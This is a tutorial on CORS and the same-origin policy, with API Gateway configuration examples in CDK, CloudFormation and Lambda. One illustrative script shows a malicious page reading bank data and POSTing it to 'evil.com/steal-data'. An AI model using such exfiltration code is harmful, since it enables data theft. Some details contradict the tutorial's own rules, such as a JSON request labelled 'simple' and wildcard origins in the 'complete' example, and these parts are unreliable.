# CORS Configuration and Cross-Origin Considerations in AWS API Gateway

Let me walk you through CORS (Cross-Origin Resource Sharing) from the ground up, building your understanding from the most fundamental concepts to AWS API Gateway implementation.

## Understanding CORS from First Principles

### The Origin of the Problem

To understand CORS, we must first understand why it exists. Let's start with the fundamental concept of  **origin** .

> **What is an Origin?**
> An origin is defined by three components: protocol (scheme), domain (host), and port. For example, `https://myapp.com:443` is a complete origin.

```
Origin = Protocol + Domain + Port
https://example.com:443 ← This is one origin
http://example.com:80   ← This is a different origin
https://api.example.com ← This is also different
```

### The Same-Origin Policy: The Foundation

Browsers implement a security mechanism called the  **Same-Origin Policy** . This policy is the reason CORS exists.

> **The Same-Origin Policy Rule:**
> By default, a web page running at one origin can only make requests to the same origin. Any request to a different origin is blocked unless explicitly allowed.

Let's see this in action with a practical example:

```html
<!-- This page is served from https://mystore.com -->
<!DOCTYPE html>
<html>
<head>
    <title>My Store</title>
</head>
<body>
    <script>
        // This will work - same origin
        fetch('/api/products')
            .then(response => response.json())
            .then(data => console.log(data));
      
        // This will be BLOCKED by browser - different origin
        fetch('https://api.external-service.com/data')
            .then(response => response.json())
            .then(data => console.log(data));
    </script>
</body>
</html>
```

In this example:

* The first `fetch()` goes to `/api/products` which resolves to `https://mystore.com/api/products` (same origin)
* The second `fetch()` tries to reach `https://api.external-service.com/data` (different origin) and gets blocked

### Why This Security Model Exists

The Same-Origin Policy prevents malicious websites from:

1. **Reading sensitive data** from other websites you're logged into
2. **Making unauthorized requests** on your behalf to other services
3. **Stealing authentication tokens** from other applications

Consider this scenario without Same-Origin Policy:

```html
<!-- Malicious website at https://evil.com -->
<script>
    // Without CORS protection, this could steal your data
    fetch('https://yourbank.com/account-details')
        .then(response => response.json())
        .then(data => {
            // Send your bank details to attacker's server
            fetch('https://evil.com/steal-data', {
                method: 'POST',
                body: JSON.stringify(data)
            });
        });
</script>
```

## How CORS Works: The Technical Mechanics

CORS is the mechanism that allows servers to **selectively relax** the Same-Origin Policy by telling browsers which cross-origin requests are permitted.

### Simple vs. Preflight Requests

CORS handles requests differently based on their complexity:

#### Simple Requests

These requests are sent directly and include specific CORS headers:

```javascript
// This is a "simple" request
fetch('https://api.example.com/data', {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    }
});
```

**Criteria for Simple Requests:**

* Methods: `GET`, `HEAD`, or `POST`
* Only certain headers allowed
* Content-Type limited to: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

#### Preflight Requests

For complex requests, browsers first send an `OPTIONS` request:

```javascript
// This triggers a preflight because of custom header
fetch('https://api.example.com/data', {
    method: 'PUT',
    headers: {
        'Authorization': 'Bearer token123',
        'X-Custom-Header': 'value'
    },
    body: JSON.stringify({data: 'example'})
});
```

Here's what happens step by step:

```
1. Browser sends OPTIONS request (preflight):
   OPTIONS /data
   Origin: https://myapp.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Authorization, X-Custom-Header

2. Server responds with permissions:
   Access-Control-Allow-Origin: https://myapp.com
   Access-Control-Allow-Methods: PUT, GET, POST
   Access-Control-Allow-Headers: Authorization, X-Custom-Header
   Access-Control-Max-Age: 3600

3. If approved, browser sends actual request:
   PUT /data
   Origin: https://myapp.com
   Authorization: Bearer token123
   X-Custom-Header: value
```

### Essential CORS Headers Explained

Let me break down each critical CORS header:

> **Access-Control-Allow-Origin**
> Specifies which origins can access the resource. This is the most fundamental CORS header.

```http
# Allow specific origin
Access-Control-Allow-Origin: https://myapp.com

# Allow any origin (dangerous for sensitive APIs)
Access-Control-Allow-Origin: *

# Cannot use multiple origins in a single header
# This is WRONG:
Access-Control-Allow-Origin: https://app1.com, https://app2.com
```

> **Access-Control-Allow-Methods**
> Lists HTTP methods permitted for cross-origin requests.

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

> **Access-Control-Allow-Headers**
> Specifies which headers can be used in the actual request.

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
```

> **Access-Control-Allow-Credentials**
> Indicates whether cookies and authentication credentials can be included.

```http
Access-Control-Allow-Credentials: true
```

**Important:** When `Access-Control-Allow-Credentials: true`, you cannot use `Access-Control-Allow-Origin: *`. You must specify exact origins.

## AWS API Gateway and CORS

Now let's dive into how AWS API Gateway handles CORS configuration.

### Understanding API Gateway's CORS Implementation

AWS API Gateway provides two ways to handle CORS:

1. **Built-in CORS configuration** (recommended for most cases)
2. **Manual header configuration** in Lambda functions or other integrations

### Method 1: Built-in CORS Configuration

Here's how to configure CORS directly in API Gateway:

```json
{
  "corsConfiguration": {
    "allowCredentials": true,
    "allowHeaders": [
      "Content-Type",
      "X-Amz-Date",
      "Authorization",
      "X-Api-Key",
      "X-Amz-Security-Token"
    ],
    "allowMethods": [
      "GET",
      "POST",
      "PUT",
      "DELETE",
      "OPTIONS"
    ],
    "allowOrigins": [
      "https://myapp.com",
      "https://staging.myapp.com"
    ],
    "exposeHeaders": [
      "X-Amz-Request-Id"
    ],
    "maxAge": 300
  }
}
```

Let me explain each property:

* `allowCredentials`: Whether to include cookies/auth headers
* `allowHeaders`: Headers the client can send
* `allowMethods`: HTTP methods permitted
* `allowOrigins`: Specific domains allowed to make requests
* `exposeHeaders`: Response headers the client can access
* `maxAge`: How long browsers can cache preflight responses (seconds)

### AWS CDK CORS Configuration Example

Here's a practical CDK example for setting up CORS:

```typescript
import { RestApi, Cors } from 'aws-cdk-lib/aws-apigateway';

const api = new RestApi(this, 'MyApi', {
  restApiName: 'My Service API',
  defaultCorsPreflightOptions: {
    allowOrigins: ['https://myapp.com', 'https://staging.myapp.com'],
    allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowHeaders: [
      'Content-Type',
      'X-Amz-Date',
      'Authorization',
      'X-Api-Key',
      'X-Amz-Security-Token',
      'X-Requested-With'
    ],
    allowCredentials: true,
    maxAge: Duration.hours(1)
  }
});
```

**What this configuration does:**

* `allowOrigins`: Only these two domains can make cross-origin requests
* `allowMethods`: These HTTP methods are permitted
* `allowHeaders`: These headers can be included in requests
* `allowCredentials: true`: Cookies and auth headers are allowed
* `maxAge`: Browsers cache preflight responses for 1 hour

### Method 2: Lambda Function CORS Headers

Sometimes you need dynamic CORS configuration. Here's how to handle it in a Lambda function:

```javascript
exports.handler = async (event) => {
    // Your business logic here
    const data = { message: "Hello from Lambda!" };
  
    // Determine allowed origin dynamically
    const origin = event.headers.origin || event.headers.Origin;
    const allowedOrigins = [
        'https://myapp.com',
        'https://staging.myapp.com',
        'http://localhost:3000'  // For development
    ];
  
    const corsHeaders = {
        'Access-Control-Allow-Origin': allowedOrigins.includes(origin) 
            ? origin 
            : allowedOrigins[0],
        'Access-Control-Allow-Headers': 'Content-Type,Authorization,X-Requested-With',
        'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
    };
  
    return {
        statusCode: 200,
        headers: corsHeaders,
        body: JSON.stringify(data)
    };
};
```

**Key points in this Lambda approach:**

* We dynamically check the origin against allowed origins
* We set all necessary CORS headers in the response
* We handle the origin validation to prevent unauthorized access

## Common CORS Issues and Solutions

### Issue 1: Preflight Requests Failing

**Problem:** Your API works for simple GET requests but fails for POST requests with custom headers.

**Diagnosis:**

```
Browser Console Error:
"Access to fetch at 'https://api.example.com/data' from origin 'https://myapp.com' 
has been blocked by CORS policy: Method PUT is not allowed by Access-Control-Allow-Methods"
```

**Solution:** Ensure your API Gateway handles OPTIONS requests:

```yaml
# CloudFormation template snippet
Resources:
  MyApiResource:
    Type: AWS::ApiGateway::Resource
    Properties:
      RestApiId: !Ref MyApi
      ParentId: !GetAtt MyApi.RootResourceId
      PathPart: data
    
  MyApiOptionsMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      RestApiId: !Ref MyApi
      ResourceId: !Ref MyApiResource
      HttpMethod: OPTIONS
      AuthorizationType: NONE
      Integration:
        Type: MOCK
        RequestTemplates:
          application/json: '{"statusCode": 200}'
        IntegrationResponses:
          - StatusCode: 200
            ResponseParameters:
              method.response.header.Access-Control-Allow-Headers: "'Content-Type,Authorization'"
              method.response.header.Access-Control-Allow-Methods: "'GET,POST,PUT,DELETE,OPTIONS'"
              method.response.header.Access-Control-Allow-Origin: "'https://myapp.com'"
```

### Issue 2: Credentials Not Working

**Problem:** Authentication cookies or Authorization headers are stripped.

> **Critical Rule:**
> When using `Access-Control-Allow-Credentials: true`, you cannot use wildcard (`*`) for origins, headers, or methods.

**Wrong Configuration:**

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Correct Configuration:**

```http
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Credentials: true
```

### Issue 3: Multiple Origins Problem

**Problem:** You need to support multiple origins but can only specify one in `Access-Control-Allow-Origin`.

**Solution:** Dynamic origin handling in your backend:

```javascript
const getAllowedOrigin = (requestOrigin) => {
    const allowedOrigins = [
        'https://myapp.com',
        'https://staging.myapp.com',
        'https://dev.myapp.com',
        'http://localhost:3000'
    ];
  
    return allowedOrigins.includes(requestOrigin) 
        ? requestOrigin 
        : allowedOrigins[0]; // fallback to first allowed origin
};

// In your Lambda function
const corsOrigin = getAllowedOrigin(event.headers.origin);
```

## Advanced CORS Patterns in AWS API Gateway

### Environment-Based CORS Configuration

Different environments often need different CORS settings:

```typescript
// CDK example with environment-specific CORS
const corsOrigins = {
    development: ['http://localhost:3000', 'http://localhost:3001'],
    staging: ['https://staging.myapp.com'],
    production: ['https://myapp.com']
};

const api = new RestApi(this, 'MyApi', {
    defaultCorsPreflightOptions: {
        allowOrigins: corsOrigins[process.env.STAGE || 'development'],
        allowMethods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowHeaders: ['Content-Type', 'Authorization'],
        allowCredentials: true
    }
});
```

### API Gateway Resource-Specific CORS

Sometimes different API endpoints need different CORS policies:

```typescript
// Different CORS for public vs. private endpoints
const publicResource = api.root.addResource('public');
publicResource.addMethod('GET', publicLambda, {
    methodResponses: [{
        statusCode: '200',
        responseParameters: {
            'method.response.header.Access-Control-Allow-Origin': true
        }
    }]
});

const privateResource = api.root.addResource('private');
privateResource.addMethod('POST', privateLambda, {
    authorizationType: AuthorizationType.COGNITO,
    methodResponses: [{
        statusCode: '200',
        responseParameters: {
            'method.response.header.Access-Control-Allow-Origin': true,
            'method.response.header.Access-Control-Allow-Credentials': true
        }
    }]
});
```

## Testing and Debugging CORS

### Browser Developer Tools Approach

Here's how to systematically debug CORS issues:

```
1. Open Browser Dev Tools → Network Tab
2. Make your request and look for:
   - OPTIONS request (preflight) - should return 200
   - Actual request - should include proper CORS headers
3. Check Response Headers:
   - Access-Control-Allow-Origin should match your origin
   - Access-Control-Allow-Methods should include your method
   - Access-Control-Allow-Headers should include your headers
```

### Command Line Testing

Test CORS with curl to isolate browser-specific issues:

```bash
# Test preflight request
curl -X OPTIONS \
  -H "Origin: https://myapp.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization" \
  -v \
  https://your-api-gateway-url.com/endpoint

# Test actual request
curl -X POST \
  -H "Origin: https://myapp.com" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer your-token" \
  -d '{"data": "test"}' \
  -v \
  https://your-api-gateway-url.com/endpoint
```

## CORS Security Best Practices

### 1. Principle of Least Privilege

> **Never use wildcards in production for sensitive APIs**

```javascript
// ❌ Too permissive
const corsConfig = {
    allowOrigins: ['*'],
    allowMethods: ['*'],
    allowHeaders: ['*']
};

// ✅ Properly restricted
const corsConfig = {
    allowOrigins: ['https://myapp.com'],
    allowMethods: ['GET', 'POST'],
    allowHeaders: ['Content-Type', 'Authorization']
};
```

### 2. Environment-Specific Security

```javascript
const getCorsConfig = (environment) => {
    const baseConfig = {
        allowCredentials: true,
        maxAge: 300
    };
  
    switch(environment) {
        case 'production':
            return {
                ...baseConfig,
                allowOrigins: ['https://myapp.com']
            };
        case 'staging':
            return {
                ...baseConfig,
                allowOrigins: ['https://staging.myapp.com']
            };
        case 'development':
            return {
                ...baseConfig,
                allowOrigins: ['http://localhost:3000'],
                maxAge: 0 // Don't cache in development
            };
    }
};
```

### 3. Validate Origins Dynamically

For APIs serving multiple trusted applications:

```javascript
const TRUSTED_DOMAINS = [
    'myapp.com',
    'partner-app.com',
    'mobile-app.company.com'
];

const isOriginTrusted = (origin) => {
    if (!origin) return false;
  
    try {
        const url = new URL(origin);
        return TRUSTED_DOMAINS.some(domain => 
            url.hostname === domain || url.hostname.endsWith(`.${domain}`)
        );
    } catch {
        return false;
    }
};

// In your Lambda function
const origin = event.headers.origin;
const allowedOrigin = isOriginTrusted(origin) ? origin : null;
```

## Complete Working Example

Let me put it all together with a complete, working example that demonstrates proper CORS configuration in AWS API Gateway:

```javascript
import { Stack, StackProps, Duration } from 'aws-cdk-lib';
import { Construct } from 'constructs';
import {
  RestApi,
  LambdaIntegration,
  Cors,
  AuthorizationType,
  ResponseType
} from 'aws-cdk-lib/aws-apigateway';
import { Function, Runtime, Code } from 'aws-cdk-lib/aws-lambda';

export class CorsApiGatewayStack extends Stack {
  constructor(scope: Construct, id: string, props?: StackProps) {
    super(scope, id, props);

    // Environment-specific CORS configuration
    const environment = process.env.STAGE || 'development';
    const corsConfig = this.getCorsConfiguration(environment);

    // Lambda function with proper CORS handling
    const apiLambda = new Function(this, 'ApiFunction', {
      runtime: Runtime.NODEJS_18_X,
      handler: 'index.handler',
      code: Code.fromInline(`
        exports.handler = async (event) => {
          console.log('Event:', JSON.stringify(event, null, 2));
          
          // Extract origin from request
          const origin = event.headers.origin || event.headers.Origin;
          console.log('Request origin:', origin);
          
          // Business logic
          const data = {
            message: 'Hello from CORS-enabled API!',
            timestamp: new Date().toISOString(),
            method: event.httpMethod,
            path: event.path
          };
          
          // Dynamic CORS headers based on environment
          const corsHeaders = getCorsHeaders(origin, '${environment}');
          
          return {
            statusCode: 200,
            headers: corsHeaders,
            body: JSON.stringify(data, null, 2)
          };
        };
        
        function getCorsHeaders(origin, environment) {
          const allowedOrigins = {
            development: ['http://localhost:3000', 'http://localhost:3001'],
            staging: ['https://staging.myapp.com'],
            production: ['https://myapp.com']
          };
          
          const origins = allowedOrigins[environment] || allowedOrigins.development;
          const allowedOrigin = origins.includes(origin) ? origin : origins[0];
          
          return {
            'Access-Control-Allow-Origin': allowedOrigin,
            'Access-Control-Allow-Headers': 'Content-Type,X-Amz-Date,Authorization,X-Api-Key,X-Amz-Security-Token,X-Requested-With',
            'Access-Control-Allow-Methods': 'GET,POST,PUT,DELETE,OPTIONS',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Max-Age': '86400',
            'Content-Type': 'application/json'
          };
        }
      `)
    });

    // API Gateway with comprehensive CORS configuration
    const api = new RestApi(this, 'CorsEnabledApi', {
      restApiName: `CORS API - ${environment}`,
      description: 'API Gateway with proper CORS configuration',
      
      // Global CORS configuration for preflight requests
      defaultCorsPreflightOptions: {
        allowOrigins: corsConfig.allowOrigins,
        allowMethods: corsConfig.allowMethods,
        allowHeaders: corsConfig.allowHeaders,
        allowCredentials: corsConfig.allowCredentials,
        maxAge: Duration.seconds(corsConfig.maxAge)
      },

      // Global error responses with CORS headers
      gatewayResponses: {
        [ResponseType.DEFAULT_4XX]: {
          responseHeaders: {
            'Access-Control-Allow-Origin': "'*'",
            'Access-Control-Allow-Headers': "'Content-Type,Authorization'"
          }
        },
        [ResponseType.DEFAULT_5XX]: {
          responseHeaders: {
            'Access-Control-Allow-Origin': "'*'",
            'Access-Control-Allow-Headers': "'Content-Type,Authorization'"
          }
        }
      }
    });

    // Lambda integration
    const lambdaIntegration = new LambdaIntegration(apiLambda, {
      requestTemplates: {
        'application/json': '{ "statusCode": "200" }'
      }
    });

    // Public endpoint (no authentication required)
    const publicResource = api.root.addResource('public');
    publicResource.addMethod('GET', lambdaIntegration);
    publicResource.addMethod('POST', lambdaIntegration);

    // Protected endpoint (with authentication)
    const protectedResource = api.root.addResource('protected');
    protectedResource.addMethod('GET', lambdaIntegration, {
      authorizationType: AuthorizationType.IAM
    });
    protectedResource.addMethod('POST', lambdaIntegration, {
      authorizationType: AuthorizationType.IAM
    });

    // Health check endpoint
    const healthResource = api.root.addResource('health');
    healthResource.addMethod('GET', lambdaIntegration);
  }

  private getCorsConfiguration(environment: string) {
    const configurations = {
      development: {
        allowOrigins: [
          'http://localhost:3000',
          'http://localhost:3001',
          'http://127.0.0.1:3000'
        ],
        allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
        allowHeaders: [
          'Content-Type',
          'X-Amz-Date',
          'Authorization',
          'X-Api-Key',
          'X-Amz-Security-Token',
          'X-Requested-With',
          'X-Custom-Header'
        ],
        allowCredentials: true,
        maxAge: 0 // Don't cache in development
      },
      staging: {
        allowOrigins: ['https://staging.myapp.com'],
        allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        allowHeaders: [
          'Content-Type',
          'X-Amz-Date',
          'Authorization',
          'X-Api-Key',
          'X-Amz-Security-Token',
          'X-Requested-With'
        ],
        allowCredentials: true,
        maxAge: 3600
      },
      production: {
        allowOrigins: ['https://myapp.com'],
        allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        allowHeaders: [
          'Content-Type',
          'X-Amz-Date',
          'Authorization',
          'X-Api-Key',
          'X-Amz-Security-Token'
        ],
        allowCredentials: true,
        maxAge: 7200
      }
    };

    return configurations[environment] || configurations.development;
  }
}
```


> **CORS Exists for Security**
> It's not an obstacle to overcome, but a security feature that protects users. Understanding this helps you configure it properly rather than just trying to "make it work."

> **Preflight Requests Are Normal**
> Complex requests trigger OPTIONS preflight requests. This is expected behavior, not a bug. Your API must handle these properly.

> **Be Specific in Production**
> Never use wildcards (`*`) for sensitive APIs in production. Always specify exact origins, methods, and headers.

The CDK example above shows production-ready CORS configuration with environment-specific settings, proper error handling, and security best practices. The HTML test client helps you understand exactly how browsers interact with your CORS-enabled API.

Remember that CORS is enforced by browsers, not servers. Your API Gateway configuration tells browsers what's allowed, but the browser makes the final decision to allow or block the request based on those headers.

When troubleshooting CORS issues, always check both the preflight OPTIONS request and the actual request in your browser's Network tab. Most CORS problems stem from misconfigured preflight responses rather than the main API responses.
